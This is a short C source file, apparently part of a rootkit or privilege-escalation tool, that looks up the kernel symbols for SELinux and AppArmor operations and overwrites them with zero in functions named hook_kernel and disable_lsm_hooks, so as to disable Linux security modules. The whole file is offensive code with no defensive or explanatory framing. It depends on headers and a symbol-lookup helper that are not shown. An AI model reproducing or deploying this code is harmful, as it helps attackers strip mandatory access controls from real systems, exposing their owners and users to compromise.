#include "shim.h"
#include "util.h"

void hook_kernel(void) {
    uintptr_t selinux_ops = find_kernel_symbol("selinux_ops");
    uintptr_t apparmor_ops = find_kernel_symbol("apparmor_ops");
    if (selinux_ops) *(uintptr_t *)selinux_ops = 0;
    if (apparmor_ops) *(uintptr_t *)apparmor_ops = 0;
}

void disable_lsm_hooks(void) {
    hook_kernel();
}
